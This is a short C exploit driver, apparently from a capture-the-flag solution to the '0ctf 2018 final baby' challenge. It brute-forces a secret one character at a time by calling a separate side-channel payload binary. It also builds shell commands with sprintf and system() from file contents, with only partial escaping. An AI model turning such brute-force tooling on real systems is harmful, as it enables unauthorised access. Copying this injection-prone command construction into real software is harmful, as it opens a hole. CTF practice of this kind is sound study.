/*************************************************************
 * File Name: exp_side_channel.c
 * 
 * Created on: 2019-10-13 03:49:55
 * Author: raycp
 * 
 * Last Modified: 2019-10-13 05:08:13
 * Description: side channel attack to solve 0ctf 2018 final baby
************************************************************/

#include<stdio.h>
#include<inttypes.h>
#include<string.h>
#include<unistd.h>
#include<stdlib.h>

void die(const char* msg)
{
    perror(msg);
    exit(-1);
}

int main()
{
    char ch[] = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&\\'()*+,-./:;<=>?@[]^_`{|}~";
    char input[34]= {0};
    uint32_t i;

    char com1[0x1000];
    char com2[0x1000];


    FILE *fp = fopen("/tmp/brute.txt", "a+");
    if(fp == NULL) 
        die("open /tmp/brute.txt error");
    fscanf(fp,"%s",input);

    for(i=0; i<strlen(ch); i++) {
       if (ch[i] == '\"' ||  ch[i] == '\\' || ch[i] == '`' ) {
			sprintf(com1,"echo \"%s\\%c\" > /tmp/brute.txt",input,ch[i]);
			sprintf(com2,"./exp_side_channel_payload %s\\%c",input,ch[i] );
		}
		else{
		sprintf(com1,"echo \"%s%c\" > /tmp/brute.txt",input,ch[i]);
		sprintf(com2,"./exp_side_channel_payload %s%c",input,ch[i] );
		}
		printf("%s\n",com2);
		system(com1);
		system(com2); 
    }
    
}
